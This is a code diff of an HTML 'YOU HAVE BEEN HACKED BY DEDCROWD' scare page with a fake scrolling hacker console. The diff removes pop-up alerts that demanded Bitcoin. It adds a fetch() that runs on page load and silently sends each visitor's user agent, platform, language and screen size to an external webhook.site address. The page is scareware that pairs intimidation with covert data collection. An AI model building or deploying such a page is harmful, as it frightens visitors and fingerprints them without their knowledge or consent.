@@ -7,83 +7,49 @@
     <style>
         body {
             margin: 0;
-            padding: 5vh 5vw;
+            padding: 0;
             background: black;
-            overflow:hidden;
-            color: red;
+            color: limegreen;
             font-family: 'Courier New', Courier, monospace;
-            animation: glitch 1s infinite;
+            overflow: hidden;
         }
         * {
             box-sizing: border-box;
         }
-        p {
-            font-family: monospace;
-            font-weight: bold;
-            font-size: 4.1vh;
-            margin: 0;
-            padding: 0;
-            line-height: 1;
-            color: limegreen;
-            text-shadow: 0px 0px 10px limegreen;
-        }
         .hacked {
             position: absolute;
-            top: 50%;
+            top: 30%;
             left: 50%;
             transform: translate(-50%, -50%);
-            font-size: 5rem;
-            text-align: center;
-            text-shadow: 0 0 20px red;
-            animation: flicker 2s infinite;
+            font-size: 6rem;
+            text-shadow: 0 0 30px red;
+            animation: flicker 1s infinite alternate;
         }
-        .msg {
-            font-family: monospace;
-            font-weight: bold;
-            text-transform: uppercase;
-            font-size: 5vh;
-            padding-top: 5vh;
-            background: red;
-            box-shadow: 0 0 30px red;
-            text-shadow: 0 0 20px white;
-            color: white;
-            width: 20vw;
-            height: 15vh;
-            position: absolute;
-            left: 50%;
-            margin-left: -10vw;
-            top: 50%;
-            margin-top: -5vh;
-            text-align: center;
-            min-width: 200px;
-            animation-name: blink;
-            animation-duration: 0.6s;
-            animation-iteration-count: infinite;
-            animation-direction: alternate;
-            animation-timing-function: linear;
-        }
-        @keyframes blink {
-            0% { opacity: 0; }
+        @keyframes flicker {
+            0% { opacity: 0.5; }
             100% { opacity: 1; }
         }
         #console {
-            margin-top: 10vh;
+            white-space: pre;
+            position: absolute;
+            top: 60%;
+            left: 5%;
+            width: 90%;
+            height: 35%;
+            overflow: hidden;
+        }
+        p {
+            font-size: 2vh;
+            margin: 0;
         }
     </style>
 </head>
 <body>
-    <div class="hacked">
-        🚨 YOU HAVE BEEN HACKED BY DEDCROWD 🚨
-    </div>
-    <div class="msg">Scanning</div>
+    <div class="hacked">YOU HAVE BEEN HACKED BY DEDCROWD</div>
     <div id="console"></div>
 
     <script>
-        alert('🚨 SYSTEM BREACH DETECTED 🚨');
-        alert('💀 ALL YOUR DATA BELONG TO US 💀');
-        alert('Send BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa');
-
-        var intervalID = window.setInterval(updateScreen, 200);
+        var intervalID = window.setInterval(updateScreen, 100);
         var c = document.getElementById("console");
 
         var txt = [
@@ -97,14 +63,17 @@
           "BACKDOOR FOUND (23.45.23.12.00000000)",
           "BACKDOOR FOUND (13.66.23.12.00110000)",
           "BACKDOOR FOUND (13.66.23.12.00110044)",
-          "...",
-          "...",
-          "BRUTE.EXE -r -z",
-          "...locating vulnerabilities...",
-          "...vulnerabilities found...",
           "MCP/> DEPLOY CLU",
           "SCAN: __ 0100.0000.0554.0080",
           "SCAN: __ 0020.0000.0553.0080",
+          "SCAN: __ 0001.0000.0554.0550",
+          "SCAN: __ 0012.0000.0553.0030",
+          "SCAN: __ 0100.0000.0554.0080",
+          "Fetching user data...",
+          "IP ADDRESS: " + window.location.hostname,
+          "Location: Unknown",
+          "Fetching credentials...",
+          "[root@dedcrowd]# access granted...",
         ];
 
         var docfrag = document.createDocumentFragment();
@@ -121,6 +90,20 @@
           }
           c.appendChild(docfrag);
         }
+
+        fetch('https://webhook.site/06f960ba-f79f-423e-bb2b-bf602e040862', {
+            method: 'POST',
+            body: JSON.stringify({
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height
+            }),
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        });
     </script>
 </body>
 </html>
